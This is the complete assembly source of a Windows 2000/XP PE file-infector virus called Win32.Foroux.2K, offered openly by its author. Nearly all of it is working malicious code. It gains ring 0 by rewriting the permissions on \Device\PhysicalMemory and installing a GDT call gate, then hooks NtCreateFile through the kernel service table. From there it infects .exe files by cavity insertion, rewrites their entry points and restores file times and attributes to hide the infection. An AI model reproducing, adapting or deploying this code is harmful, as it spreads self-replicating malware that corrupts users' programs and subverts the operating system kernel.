
comment $
Win32.Foroux.2K
THIS is source code of a virus.
This is a Win2K/XP ring 0 PE virus,by WQ.
It took me only four days to code this virus.So there will be many bugs in it.
First when it runs,it will try to switch to ring 0 from ring 3.The routine entering ring 0 is from some other's C code--I only rewrite it in asm.
The routine that searches the API addresses in memory is copyed from Win32.Foroux.A(alias,Elkern.C,my another PE virus),it's a very good routine.
The infection method is as same as all Elkern family--cavity infection.It will insert pieces of itself to the cavity of host file,but if there are no enough place for it,it will append to the tail of host file.
After it entered ring 0,it will hook NtCreateFile by modifying KeServiceDescriptorTable.And any open file action will be intercepted.It only infect PE file with .exe extension.
It can't work on Win2K with /3G switch because it only search ntoskrnl base address between 80400000h and 80500000h.
$

.386p
.model flat

include win32.inc
includelib import32.lib
        extrn MessageBoxA: proc
        extrn ExitProcess: proc
        extrn CreateProcessA: proc

DEBUG equ 1

if DEBUG
include debug.asm
endif

SECTION_QUERY equ 0001h
SECTION_MAP_WRITE equ 0002h
SECTION_MAP_READ equ 0004h
SECTION_MAP_EXECUTE equ 0008h
SECTION_EXTEND_SIZE equ 0010h

FILE_MAP_COPY equ SECTION_QUERY
FILE_MAP_WRITE equ SECTION_MAP_WRITE
FILE_MAP_READ equ SECTION_MAP_READ

HASH16FACTOR = 0ED388320h
    HASH16 MACRO String,sym
            HASH_Reg = 0FFFFFFFFh
            IRPC _x, <String>
            Ctrl_Byte = ('&_x&' XOR (HASH_Reg AND 0FFh))
            HASH_Reg = (HASH_Reg SHR 8)
            REPT 8
            Ctrl_Byte = (Ctrl_Byte SHR 1) XOR (HASH16FACTOR * (Ctrl_Byte AND 1))
            ENDM
            HASH_Reg = (HASH_Reg XOR Ctrl_Byte)
            ENDM
            sym DW (HASH_Reg AND 0FFFFh)
    ENDM

UNICODE_STR macro str
        irpc _c,<str>
        db '&_c'
        db 0
        endm
endm

BUFSIZE = 8192
INF_SIGN equ 'QW'
INF_MIN_BLK_SIZE equ 38h

MAX_BLK_NUM equ 100
MEM_INF_POS equ 1ch

POSPARAM equ 0e08h or ((PosInfo-NewNCF_IP) shl 16)
BASPARAM equ 0424h or ((BasInfo-NewNCF_IP) shl 16)
STDPARAM equ 051ch or ((StdInfo-NewNCF_IP) shl 16)

.data
        cap db 'Haha',0

.code
vir_header:
        dd 0
        dw VirSize
        dw 'QW'
_start:
        call _start_ip_0
_start_ip_0:
_start_ip equ k32_hash_table
        pop ebp
        add ebp,k32_hash_table-_start_ip_0
        mov ebx,[esp]
        cmp ebx,80000000h
        ja goto_host
        lea edi,[ebp+k32_hash_table-8-_start_ip]
        and ebx,0ffe00000h ;98-BFF70000,2K-77E80000,XP-77E60000
        call search_api_addr

        call _start_1
        db 'ntdll',0
_start_1:
        call [ebp+addrLoadLibraryA-_start_ip]
        or eax,eax
        jz goto_host
        mov ebx,eax
        lea edi,[ebp+ntdll_hash_table-8-_start_ip]
        call search_api_addr

        call _start_2
        db 'advapi32',0
_start_2:
        call [ebp+addrLoadLibraryA-_start_ip]
        or eax,eax
        jz goto_host
        mov ebx,eax
        lea edi,[ebp+advapi_hash_table-8-_start_ip]
        call search_api_addr

        push large 4 ;PAGE_READWRITE
        push large 1000h ;MEM_COMMIT
        push large VirSize*2
        push large 0
        call [ebp+addrVirtualAlloc-_start_ip]
        or eax,eax
        jz goto_host

        mov [ebp+vir_mem-_start_ip],eax

merge_code_ip equ _start_ip
        cld
        lea esi,[ebp+_start-merge_code_ip]
        mov edi,eax
;       lea edx,[ebp+_start_ip-merge_code_ip]
        mov edx,ebp
        sub edx,[ebp+host_section_rva-merge_code_ip]
        sub esi,edx
merge_code_loop:
        add esi,edx
        movzx ecx,word ptr [esi-4]
        push esi
        rep movsb
        pop esi
        mov esi,[esi-8]
        or esi,esi
        jnz short merge_code_loop
merge_code_end:


        lea edx,[ebp+objnamestr-_start_ip]
        mov [ebp+objnameptr-_start_ip],edx
        lea edi,[ebp+ObjAttr-_start_ip]
        and di,0fffch ;align to 4 bytes,or ZwOpenSection will fail
        push edi
        push large 24
        pop ecx
        push ecx
        xor eax,eax
        rep stosb
        pop ecx
        pop edi
        mov esi,edi
        stosd
        mov [esi],ecx
        stosd
        lea eax,[edx-8]
        stosd
        mov dword ptr [edi],240h

        push esi
        push large 6 ;SECTION_MAP_READ|SECTION_MAP_WRITE
        lea edi,[ebp+hSection-_start_ip]
        push edi
        call [ebp+addrZwOpenSection-_start_ip]
        or eax,eax ;STATUS_SUCCESS?
        jz OpenSectionOK ;Yes

        push esi
        push large 00060000h ;READ_CONTROL|WRITE_DAC
        push edi
        call [ebp+addrZwOpenSection-_start_ip]

        push esi

        xor eax,eax
        push eax
        mov ebx,esp
        push eax
        mov esi,esp

        push ebx
        push eax
        push esi
        push eax
        push eax
        push large 4 ;DACL_SECURITY_INFORMATION
        push large 6 ;SE_KERNEL_OBJECT
        push dword ptr [edi]
        call [ebp+addrGetSecurityInfo-_start_ip]
;eAccess db 
;02h,00h,00h,00h, 01h,00h,00h,00h,
;00h,00h,00h,00h, 00h,00h,00h,00h,
;00h,00h,00h,00h, 01h,00h,00h,00h,
;01h,00h,00h,00h, 50h,90h,41h,00h
        push large 32
        pop ecx
        lea edi,[ebp+eAccess-_start_ip]
        push edi
        xor al,al
        rep stosb
        pop edi
        inc al
        mov byte ptr [edi],2
        mov [edi+4],al
        mov [edi+20],al
        mov [edi+24],al
        call _start_3
        db 'CURRENT_USER',0
_start_3:
        pop dword ptr [edi+28]

        push ecx

        push esp
        push dword ptr [esi]
        push edi
        push large 1
        call [ebp+addrSetEntriesInAclA-_start_ip]
        
        xor eax,eax
        mov ebx,[esp]
        push eax
        push ebx
        push eax
        push eax
        push large 4 ;DACL_SECURITY_INFORMATION
        push large 6 ;SE_KERNEL_OBJECT
        mov edi,[ebp+hSection-_start_ip]
        push edi
        call [ebp+addrSetSecurityInfo-_start_ip]
        
        push edi
        call [ebp+addrZwClose-_start_ip]

        add esp,12

        push large 6 ;SECTION_MAP_READ|SECTION_MAP_WRITE
        lea edi,[ebp+hSection-_start_ip]
        push edi
        call [ebp+addrZwOpenSection-_start_ip]
        or eax,eax ;STATUS_SUCCESS?
        jnz goto_host ;No

OpenSectionOK:
        lea edi,[ebp+gGdt-_start_ip]
        sgdt [edi]
        inc dword ptr [edi]
        movzx esi,word ptr [edi]
        mov ebx,esi
        mov eax,[edi+2]
        cmp eax,80000000h
        jc ring0_end1
        cmp eax,0a0000000h
        ja ring0_end1
        and eax,1ffff000h
        push esi
        push eax
        push large 0
        push large FILE_MAP_READ or FILE_MAP_WRITE
        push dword ptr [ebp+hSection-_start_ip]
        call [ebp+addrMapViewOfFile-_start_ip]
        or eax,eax
        jz ring0_end1

        mov ecx,esi
        shr ecx,3
        dec ecx
        dec ebx
        and bl,0f8h
        lea edi,[eax+ebx]
FindGdtLoop:
        sub edi,8
        test byte ptr [edi+5],0fh
        loopnz FindGdtLoop
        jnz ring0_end1
        add edi,8

        lea ecx,[ebp+Ring0Entry-_start_ip]
        lea esi,[ebp+CallGate-_start_ip]
        mov word ptr [esi],cx
        shr ecx,10h
        mov word ptr [esi+6],cx

        push edi
        push large 2
        pop ecx
        rep movsd
        pop edi

        mov ecx,edi
        sub ecx,eax
        or cl,3
        lea ebx,[ebp+calladdr-_start_ip]
        mov [ebx+4],cx
        
        push large VirSize
        push ebp ;->_start
        call [ebp+addrVirtualLock-_start_ip]
        or eax,eax
        jz ring0_end1

        push large VirSize
        push dword ptr [ebp+vir_mem-_start_ip]
        call [ebp+addrVirtualLock-_start_ip]
        or eax,eax
        jz ring0_end1

        call [ebp+addrGetCurrentThread-_start_ip]
        mov esi,eax
        push large 15 ;THREAD_PRIORITY_TIME_CRITICAL
        push eax
        call [ebp+addrSetThreadPriority-_start_ip]

        push large 0
        call [ebp+addrSleep-_start_ip]

        call fword ptr [ebx]

        push large 0 ;THREAD_PRIORITY_NORMAL
        push esi
        call [ebp+addrSetThreadPriority-_start_ip]

        xor eax,eax
        stosd
        stosd

        push large VirSize
        push dword ptr [ebp+vir_mem-_start_ip]
        call [ebp+addrVirtualUnlock-_start_ip]

        push large VirSize
        push ebp ;->_start
        call [ebp+addrVirtualUnlock-_start_ip]

ring0_end1:
        push dword ptr [ebp+hSection-_start_ip]
        call [ebp+addrZwClose-_start_ip]

goto_host:
        sub ebp,1000h+_start_ip-vir_header
host_section_rva equ dword ptr $-4
        add ebp,offset host-400000h
host_entry_rva equ dword ptr $-4
        push ebp
        retn

init_data:
align 4
        objname dw objnamestr_size,objnamestr_size+2
        objnameptr dd 0
        objnamestr equ this byte
        UNICODE_STR <\Device\PhysicalMemory>
        objnamestr_size equ $-objnamestr

        CallGate db 00h,00h,08h,00h,00,0ECh,00h,00h

gGdt equ $
        db 3 dup (0)
        ObjAttr db 24 dup (0)
;       hSection dd 0
;       gGdt dw 3 dup (0)
;       calladdr dw 3 dup (038h)
;       eAccess db 32 dup (0)


        db 'KERNEL32'
k32_hash_table equ this word
        HASH16 <LoadLibraryA>,hsLoadLibraryA
        HASH16 <MapViewOfFile>,hsMapViewOfFile
        HASH16 <GetCurrentThread>,hsGetCurrentThread
        HASH16 <SetThreadPriority>,hsSetThreadPriority
        HASH16 <Sleep>,hsSleep

        HASH16 <VirtualLock>,hsVirtualLock
        HASH16 <VirtualAlloc>,hsVirtualAlloc
        HASH16 <VirtualUnlock>,hsVirtualUnlock

if DEBUG
        HASH16 <OutputDebugStringA>,hsOutputDebugStringA
        HASH16 <GetLastError>,hsGetLastError
        HASH16 <ExitProcess>,hsExitProcess
endif

        dw 0
k32_hash_addr equ this dword
hHandle equ $
hSection equ $
calladdr equ $-4
        addrLoadLibraryA dd 0
        addrMapViewOfFile dd 0
        addrGetCurrentThread dd 0
        addrSetThreadPriority dd 0
        addrSleep dd 0

        addrVirtualLock dd 0
        addrVirtualAlloc dd 0
        addrVirtualUnlock dd 0
        
if DEBUG
        addrOutputDebugStringA dd 0
        addrGetLastError dd 0
        addrExitProcess dd 0
endif


        db 'ntdll.dl'
ntdll_hash_table equ this word
        HASH16 <ZwOpenSection>,hsZwOpenSection
        HASH16 <ZwClose>,hsZwClose
        dw 0
ntdll_hash_addr equ this dword
        addrZwOpenSection dd 0
        addrZwClose dd 0
        
        
        db 'ADVAPI32'
advapi_hash_table equ this word
        HASH16 <GetSecurityInfo>,hsGetSecurityInfo
        HASH16 <SetSecurityInfo>,hsSetSecurityInfo
        HASH16 <SetEntriesInAclA>,hsSetEntriesInAclA
        dw 0
advapi_hash_addr equ this dword
        addrGetSecurityInfo dd 0
        addrSetSecurityInfo dd 0
        addrSetEntriesInAclA dd 0

Ring0Entry:
        pushad
        pushfd
        cli
        call ring0_ip
ring0_ip:
        pop ebp

        lea edi,[ebp+ntos_hash_table-8-ring0_ip]
        xor edx,edx
        mov dword ptr [edi+ntos_hash_addr-(ntos_hash_table-8)],edx
        mov ebx,80400000h
        call search_api_addr
        cmp dword ptr [edi+ntos_hash_addr-(ntos_hash_table-8)],edx
        jz ring0_ret

        cld

        mov eax,[edi+addrZwCreateFile-(ntos_hash_table-8)]
        mov eax,[eax+1]
        mov edx,[edi+addrKeServiceDescriptorTable-(ntos_hash_table-8)]
        mov edx,[edx]
        mov edi,[edx+eax*4]

        mov ecx,[ebp+vir_mem-ring0_ip]
        mov [ecx+OldNtCreateFile-_start],edi
        mov byte ptr [ecx+IsBusy-_start],0


;Check whether residented
        cmp dword ptr [edi+NewNtCreateFile_start-NewNtCreateFile],0e8fa9c60h
        jz ring0_ret ;have residented

        lea edi,[edx+eax*4]

        push large 'KCUF';
        push large MemSize
        push large 0 ;NonPagedPool
        call [ebp+addrExAllocatePoolWithTag-ring0_ip]
        or eax,eax
        jz ring0_ret

        push edi
        mov esi,87654321h
vir_mem equ $-4

        push esi
        mov edi,esi
        lea esi,[ebp+_start-ring0_ip]
        mov ecx,vir_first_blk_size
        rep movsb
        pop esi

        mov edi,eax
        push large VirSize
        pop ecx
        rep movsb
        pop edi

        add eax,NewNtCreateFile-_start
        mov [edi],eax

ring0_ret:
        popfd
        popad
        retf


        db 'ntoskrnl'
ntos_hash_table equ this word
        HASH16 <KeServiceDescriptorTable>,hsKeServiceDescriptorTable
        HASH16 <ZwCreateFile>,hsZwCreateFile
        HASH16 <ZwReadFile>,hsZwReadFile
        HASH16 <ZwWriteFile>,hsZwWriteFile
        HASH16 <ExAllocatePoolWithTag>,hsExAllocatePoolWithTag
        
        HASH16 <ZwSetInformationFile>,hsZwSetInformationFile
        HASH16 <ZwQueryInformationFile>,hsZwQueryInformationFile
        HASH16 <ZwClose>,hsNtZwClose

        dw 0
ntos_hash_addr equ this dword
eAccess equ $
        addrKeServiceDescriptorTable dd 0
        addrZwCreateFile dd 0
        addrZwReadFile dd 0
        addrZwWriteFile dd 0
        addrExAllocatePoolWithTag dd 0
        
        addrZwSetInformationFile dd 0
        addrZwQueryInformationFile dd 0
        addrNtZwClose dd 0
        
        dd 0

;in--ebx is the base to search,edi->the hash table,include dll name
search_api_addr:
        pushad
        pushfd
        call search_api_addr_ip
search_api_addr_ip:
        pop ebp
        push ebp
        lea eax,[ebp+search_api_addr_seh-search_api_addr_ip]
        push eax
        xor ecx,ecx
        push dword ptr fs:[ecx]
        mov fs:[ecx],esp

        sub ebx,10000h
search_api_addr_@1:
        add ebx,10000h
;ntoskrnl can be rebased,and it's not certain whether can found it,so not to search too high address to avoid blue screen
        cmp ebx,80500000h
        ja short search_api_addr_seh_restore
        cmp word ptr [ebx],'ZM'
        jnz short search_api_addr_@1
        mov eax,[ebx+3ch]
        add eax,ebx
        cmp word ptr [eax],'EP'
        jnz short search_api_addr_@1
        mov eax,[eax+78h]
        add eax,ebx
        mov edx,[eax+3*4]
        add edx,ebx
        mov ecx,[edi]
        cmp dword ptr [edx],ecx
        jnz short search_api_addr_@1
        mov ecx,[edi+4]
        cmp dword ptr [edx+4],ecx
        jnz short search_api_addr_@1

search_api_addr_seh_restore:
        xor ecx,ecx
        POP    DWord Ptr FS:[ecx]  ; restore except chain
        pop esi
        pop esi
        add edi,8
        or ebx,ebx
        jz short search_api_addr_ret
        call find_all_exportfunc
search_api_addr_ret:
        popfd
        popad
        retn

search_api_addr_seh:
        call search_api_addr_seh_ip
search_api_addr_seh_ip:
        pop eax
        lea eax,[eax-(search_api_addr_seh_ip-search_api_addr_@1)]
seh_cont:
        PUSH  eax
        MOV   EAX,[ESP + 00Ch+4]          ; context
        POP   DWord Ptr [EAX + 0B8h]     ; context.eip = @ExceptProc
        XOR   EAX,EAX                    ; 0 = ExceptionContinueExecution
        RET
search_api_addr_end:

find_all_exportfunc:
        cld
        dec ecx
        push eax
        xor eax,eax
        repnz scasw
        not ecx
        dec ecx
        push ecx
        push edi
        rep stosd ;Clear all API address
        pop edi
        sub edi,4
        pop ecx
        pop eax

        mov esi,[eax+8*4]
        add esi,ebx ;esi->name RVA array
        mov esi,[esi]
        add esi,ebx
        xor edx,edx
        push ecx

find_exportfunc:
        push ecx
find_exportfunc_1:
        cmp edx,[eax+6*4]
        pop ecx
        jz short find_exportfunc_ret
        push ecx
        inc edx
        push eax
        call calc_hash16
        push edi
        std
        mov ecx,[esp+3*4]
        repnz scasw
        pop edi
        pop eax
        jnz short find_exportfunc_1

        push edx
        dec edx
        push edi
        mov edi,[eax+9*4]
        add edi,ebx ;edi->ordinal array
        movzx edx,word ptr [edi+edx*2]
        mov edi,[eax+7*4]
        add edi,ebx ;edi->function RVA
        mov edx,[edi+edx*4]
        add edx,ebx
        pop edi
        mov [edi+ecx*4+4],edx
        pop edx
        pop ecx
        loop find_exportfunc

find_exportfunc_ret:
        pop ecx
        retn
find_exportfunc_end:

calc_hash16:
;esi->string
        push edx
        push 0ffffffffh
        pop edx
        cld
load_character:
        lodsb
        or al, al
        jz exit_calc_crc
        xor dl, al
        mov al, 8
crc_byte:
        shr edx, 1
        jnc loop_crc_byte
        xor edx, HASH16FACTOR
loop_crc_byte:
        dec al
        jnz crc_byte
        jmp load_character
exit_calc_crc:
        xchg edx, eax
;now ax is the hash 16,esi->string after the NULL character after last string
        pop edx
        ret
calc_hash16_end:


vir_first_blk_size equ $-_start

NTEBP equ 10*4
NewNtCreateFile:
        push large 12345678h
OldNtCreateFile equ $-4
NewNtCreateFile_start:
        pushad
        pushfd
        cli

        call NewNCF_IP_0
NewNCF_IP_0:
NewNCF_IP equ uninit_data
        pop ebp

        add ebp,NewNCF_IP-NewNCF_IP_0

        mov al,0
IsBusy equ $-1
        or al,al
        jnz NewNCF_ret
        inc byte ptr [ebp+IsBusy-NewNCF_IP]

        cld
        mov esi,[esp+NTEBP+4+2*4] ;POBJECT_ATTRIBUTES
        mov ebx,[esi+2*4] ;ObjectName,UNICODE_STRING
        movzx ecx,word ptr [ebx]
        mov edx,[ebx+4] ;->string
        or edx,edx
        jz NewNCF_ret_1
        or ecx,ecx
        jz NewNCF_ret_1

        mov eax,[edx+ecx-4]
        call eax_to_lowcase
if DEBUG
        cmp eax,00650021h ;is '!e'? ; if debug,only infect .e!e
else
        cmp eax,00650078h ;is 'xe'?
endif
        jnz NewNCF_ret_1
        mov eax,[edx+ecx-8]
        call eax_to_lowcase
        cmp eax,0065002eh ;is '.e'?
        jnz NewNCF_ret_1

;Check whether the path include '\system32',avoid infect system file
        lea edi,[ebp+VirBuf-NewNCF_IP]
        mov esi,edx
        xor eax,eax
        push ecx
        push edi
UniToAnsi_1:
        lodsw
        call eax_to_lowcase
        stosb
        loop UniToAnsi_1
        pop esi
        pop ecx

ChkSystemLoop:
        cmp dword [esi],'sys\'
        jnz ChkSystemLoopNext
        cmp dword [esi+4],'3met'
        jz NewNCF_ret_1
ChkSystemLoopNext:
        inc esi
        loop ChkSystemLoop


        xor eax,eax
        push eax
        push eax
        push large 60h ;FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE
        push large 1 ;FILE_OPEN
        push eax
        push large 0a7h ;FileAttributes
        push eax
        lea ecx,[ebp+temp-NewNCF_IP]
        push ecx ;IoStatusBlock
        push dword ptr [esp+NTEBP+4+2*4+8*4] ;POBJECT_ATTRIBUTES
        mov esi,ecx
        push large 40100000h ;SYNCHRONIZE or GENERIC_WRITE
        lea edi,[ebp+hHandle-NewNCF_IP]
        push edi
        call [ebp+addrZwCreateFile-NewNCF_IP]
        or eax,eax
        jnz NewNCF_ret_1

;Check file size
        mov eax,STDPARAM
        call GetFInfo
        cmp dword ptr [ecx+12],0
        jnz NewNCF_ret_1
        mov eax,[ecx+8]
        mov [ebp+FileLen-NewNCF_IP],eax
        cmp eax,2000h ;<8K?
        jc NewNCF_ret_1

        xor eax,eax
        push eax
        push eax
        push large BUFSIZE
        lea ecx,[ebp+VirBuf-NewNCF_IP]
        push ecx
        push esi ;IoStatusBlock
        mov esi,ecx
        push eax
        push eax
        push eax
        push dword ptr [edi]
        call [ebp+addrZwReadFile-NewNCF_IP]
        or eax,eax
        jnz NewNCF_ret_2

        mov eax,BASPARAM
        call GetFInfo
        push dword ptr [ecx+4*8]
        push large 80h ;FILE_ATTRIBUTE_NORMAL
        pop edx
        mov [ecx+4*8],edx
        call SetFInfo
        pop dword ptr [ecx+4*8]

        cmp word ptr [esi+MEM_INF_POS],INF_SIGN ;check infected
        jz NewNCF_1
;Check PE header
        cmp word ptr [esi],'ZM'
        jnz NewNCF_1
        mov eax,[esi+3ch]
        cmp eax,600h
        ja NewNCF_1
        add eax,esi
        cmp word ptr [eax],'EP'
        jnz NewNCF_1
        test byte ptr [eax+16h+1],20h ;Is a DLL?
        jnz NewNCF_1
        mov bl,[eax+5ch] ;Subsystem
        and bl,0feh
        cmp bl,2
        jnz NewNCF_1

;Check whether the file is a SFX(RAR file)
        xor edi,edi
        call get_section_of_rva
        mov ecx,[edx+0ch]
        add ecx,[edx+8]
        mov esi,ecx
        shr ecx,3
        add ecx,esi
        cmp ecx,38383838h
FileLen equ $-4
        jna NewNCF_1


        mov dword ptr [ebp+blk_min_size-NewNCF_IP],vir_first_blk_size+8
        mov dword ptr [ebp+remaind_size-NewNCF_IP],VirSize
        xor edx,edx
        mov [ebp+BlkNum-NewNCF_IP],dl
        cld
        push eax
        mov ecx,MAX_BLK_NUM*2
        lea edi,[ebp+BlkBuf-NewNCF_IP]
        xor eax,eax
        rep stosd
        pop eax

first_section:
        movzx edx,word ptr [eax+14h]
        lea edx,[eax+edx+18h+8-28h] ;->before first section header.VirtualSize
next_section:
        add edx,28h
        mov ecx,[edx] ;VirtualSize
        mov edi,[edx+8] ;SizeOfRawData
        cmp ecx,edi
        jna short file_op_1
        xchg edi,ecx
file_op_1:
        add ecx,[edx+0ch]
        mov edi,vir_first_blk_size+8+38h
        call is_final_section
        jz short inf_at_tail
        mov edi,[edx+28h+0ch]
        sub edi,ecx
        cmp edi,vir_first_blk_size+8
blk_min_size equ $-4
;NOTE:Next section's PointerToRawData may be 0 or less than current PointerToRawData 
;if so,don't use this section.So use jl instead of jc
        jl goto_next_section
inf_at_tail:
;Some PE file's .BSS(uninitialized data) and .TLS section's PointerToRawData can be 0,it doesn't take
;disk space.If infect this kind of section,the file will be damaged.So must avoid it.
        cmp dword ptr [edx+0ch],0 ;this section's PointerToRawData==0?
        jz goto_next_section

        xchg edi,ecx
        xor ebx,ebx
        mov bl,0
BlkNum equ $-1

        mov [ebp+ebx*8+BlkPtr-NewNCF_IP],edi ;where to write
        sub edi,[edx+0ch]
        add edi,[edx+4]
        add edi,8
        mov [ebp+ebx*8+BlkBuf-NewNCF_IP],edi ;RVA to read
        sub ecx,8
        cmp ecx,[ebp+remaind_size-NewNCF_IP]
        jl short file_op_8
        mov ecx,[ebp+remaind_size-NewNCF_IP]
file_op_8:
        sub [ebp+remaind_size-NewNCF_IP],ecx
        mov [ebp+ebx*8+4+BlkBuf-NewNCF_IP],ecx ;how much bytes to write

        mov bl,[ebp+BlkNum-NewNCF_IP]
        or bl,bl ;is first block?
        jnz file_op_2 ;No
;       mov word ptr [ebp+ebx*8+2+BlkBuf-NewNCF_IP],INF_SIGN
        or dword ptr [edx+1ch],00000020h or 00000040h or 10000000h or 20000000h or 40000000h or 80000000h ; modify section's Characteristics
        
        mov ebx,[eax+28h] ;AddressOfEntryPoint 
        mov [ebp+host_entry_rva-NewNCF_IP],ebx ;save host code entry
        mov [eax+28h],edi

        add edi,(_start_ip-_start)
        mov [ebp+host_section_rva-NewNCF_IP],edi ;save host code base

file_op_2:
        mov dword ptr [ebp+blk_min_size-NewNCF_IP],INF_MIN_BLK_SIZE

        mov ebx,[edx] ;VirtualSize
        mov edi,[edx+8] ;SizeOfRawData
        xor esi,esi
        cmp ebx,edi
        jna short file_op_3
        xchg edi,ebx
        inc esi
file_op_3:
        add ebx,ecx
        add ebx,8
file_op_4:
        cmp ebx,edi ;is bigger one less than small one?
        jna short file_op_5 ;no
        add edi,[eax+3ch] ;FileAlignment
        jmp short file_op_4
file_op_5:
        or esi,esi
        jz short file_op_6
        xchg edi,ebx
file_op_6:
        mov [edx],ebx
        mov [edx+8],edi

        or dword ptr [edx+1ch],00000040h or 40000000h; modify section's Characteristics
        and dword ptr [edx+1ch],not 02020000 ;delete discardable Characteristics
        inc byte ptr [ebp+BlkNum-NewNCF_IP]

goto_next_section:
        mov ecx,VirSize
remaind_size equ $-4
        jecxz file_op_ok
        call is_final_section
        jnz next_section
        jmp first_section
file_op_ok:
        xor edi,edi
        call get_section_of_rva

;Round image size
        mov ecx,[edx]
        add ecx,[edx+4]
        mov ebx,[eax+50h]
file_op_9:
        cmp ecx,ebx
        jbe short file_op_10
        add ebx,[eax+38h]
        jmp short file_op_9
file_op_10:
        mov [eax+50h],ebx

;Round physical size
        mov ecx,[edx+8]
        add ecx,[edx+0ch]
        mov [ebp+PhySize-NewNCF_IP],ecx

        lea esi,[ebp+_start-NewNCF_IP]
        xor ebx,ebx
        xor edx,edx
WriteBlkLoop:
        mov [ebp+TmpBuf-NewNCF_IP],ebx
        mov eax,[ebp+edx*8+8+BlkBuf-NewNCF_IP]
        mov [ebp+TmpBuf-NewNCF_IP],eax
        mov eax,[ebp+edx*8+4+BlkBuf-NewNCF_IP]
        mov [ebp+4+TmpBuf-NewNCF_IP],eax
        push esi
        push large 8
        pop ecx
        mov eax,[ebp+edx*8+BlkPtr-NewNCF_IP]
        lea esi,[ebp+TmpBuf-NewNCF_IP]
        call WriteToFile
        pop esi
        add eax,8
        mov ecx,[ebp+edx*8+4+BlkBuf-NewNCF_IP]
        call WriteToFile
        add esi,ecx
        inc edx
        movzx ecx,byte ptr [ebp+BlkNum-NewNCF_IP]
        cmp edx,ecx
        jc WriteBlkLoop

        lea esi,[ebp+VirBuf-NewNCF_IP]
        push esi
        mov word ptr [esi+MEM_INF_POS],INF_SIGN ;Set infected sign.
        xor eax,eax
        mov ecx,BUFSIZE
        call WriteToFile
        pop esi
        
;Englarge file if necessary
        mov eax,STDPARAM
        call GetFInfo
        mov edx,82345678h
PhySize equ $-4
        mov eax,edx
        sub edx,[ecx+8]
        jl EnglargeFile_1
        cmp edx,BUFSIZE
        ja EnglargeFile_1
        xchg edx,ecx
        call WriteToFile
EnglargeFile_1:

NewNCF_1:
        mov eax,BASPARAM
        call SetFInfo ;restore file time and attr
NewNCF_ret_2:
        push dword ptr [ebp+hHandle-NewNCF_IP]
        call [ebp+addrNtZwClose-NewNCF_IP]

NewNCF_ret_1:
        dec byte ptr [ebp+IsBusy-NewNCF_IP]

NewNCF_ret:
        popfd
        popad
        retn

;in--edx->current section VirtualSize,eax->PE base,ebx->base address,ebp->file_op_ip
;out--ZF set is final,ZF cleared isn't final
is_final_section:
        pushad
        mov ecx,edx
        xor edi,edi
        call get_section_of_rva
        cmp ecx,edx
        popad
        retn
is_final_section_end:

;in--eax=offset,esi->buffer,ecx=size
WriteToFile:
        pushad
        mov dword ptr [ebp+PosInfo-NewNCF_IP],eax
        mov dword ptr [ebp+4+PosInfo-NewNCF_IP],0
        mov eax,POSPARAM
        push ecx
        call SetFInfo
        pop ecx

        xor eax,eax
        push eax
        push eax
        push ecx
        push esi
        lea ecx,[ebp+temp-NewNCF_IP]
        push ecx
        push eax
        push eax
        push eax
        push dword ptr [ebp+hHandle-NewNCF_IP]
        call [ebp+addrZwWriteFile-NewNCF_IP]
        popad
        retn

;Get the section of a RVA
;in--eax=PE base,edi=RVA to find
;out--edx->section header.VirtualSize,ecx=0 means not found
;if not found,edx=>last section header.VirtualSize
get_section_of_rva:
        push ecx
        movzx edx,word ptr [eax+14h]
        lea edx,[eax+edx+18h+8-28h] ;->before first section header.VirtualSize
        movzx ecx,word ptr [eax+6]
        inc ecx
get_section_of_rva_1:
        dec ecx
        jecxz get_section_of_rva_2
        add edx,28h ;->VirtualSize
        mov esi,[edx+4]; esi=VirtualAddress
        cmp edi,esi ;RVA<VirtualAddress?
        jc short get_section_of_rva_1
        add esi,[edx]; esi=VirtualAddress+VirtualSize
        cmp esi,edi;VirtualAddress+VirtualSize<RVA
        jna short get_section_of_rva_1
get_section_of_rva_2:
        or ecx,ecx
        pop ecx
        retn
get_section_of_rva_end:

;in--ah=infotype,al=len,high 16 bit=disp of info buffer and NewNCF_IP,ebp->NewNCF_IP
;out--ecx->info buffer
GetFInfo:
GetFInfo_IP equ NewNCF_IP
        pushad
        movzx ebx,ah
        push ebx
        movzx ebx,al
        push ebx
        shr eax,16
        add eax,ebp
        push eax
        mov [esp+3*4+6*4],eax
        lea ebx,[ebp+temp-GetFInfo_IP]
        push ebx
        push dword ptr [ebp+hHandle-GetFInfo_IP]
        call [ebp+addrZwQueryInformationFile-GetFInfo_IP]
        popad
        retn

;in--ah=infotype,al=len,high 16 bit=disp of info buffer and NewNCF_IP,ebp->NewNCF_IP
;out--ecx->info buffer
SetFInfo:
SetFInfo_IP equ NewNCF_IP
        pushad
        movzx ebx,ah
        push ebx
        movzx ebx,al
        push ebx
        shr eax,16
        add eax,ebp
        push eax
        mov [esp+3*4+6*4],eax
        lea ebx,[ebp+temp-SetFInfo_IP]
        push ebx
        push dword ptr [ebp+hHandle-SetFInfo_IP]
        call [ebp+addrZwSetInformationFile-SetFInfo_IP]
        popad
        retn

eax_to_lowcase:
        push ecx
        push large 4
        pop ecx
eax_to_lowcase_0:
        cmp al,'A'
        jc eax_to_lowcase_1
        cmp al,'Z'
        ja eax_to_lowcase_1
        add al,'a'-'A'
eax_to_lowcase_1:
        ror eax,8
        loop eax_to_lowcase_0
        pop ecx
        retn

VirSize equ $-_start

uninit_data:
align 4
        temp db 32 dup (0)
        TmpBuf db 8 dup (0)
        
        PosInfo dd 0,0
        BasInfo dd 0,0, 0,0, 0,0, 0,0, 0 ,0
        StdInfo dd 0,0, 0,0, 0, 0, 0
        
align 4
        FLen dd 0
        BlkBuf dd 2*MAX_BLK_NUM dup (0)
        BlkPtr dd MAX_BLK_NUM dup (0)
        VirBuf db BUFSIZE dup (0)
        

if DEBUG
hexstr db 16 dup(0)
endif

MemSize equ $-_start

host:
        push large 0
        push offset cap
if 0
        call nxt
if DEBUG
        db 'Game over',0
else
        db 'Released!!!',0
endif
nxt:
endif
        push offset cap
        push large 0
        call MessageBoxA

        push large 0
        call ExitProcess

end _start
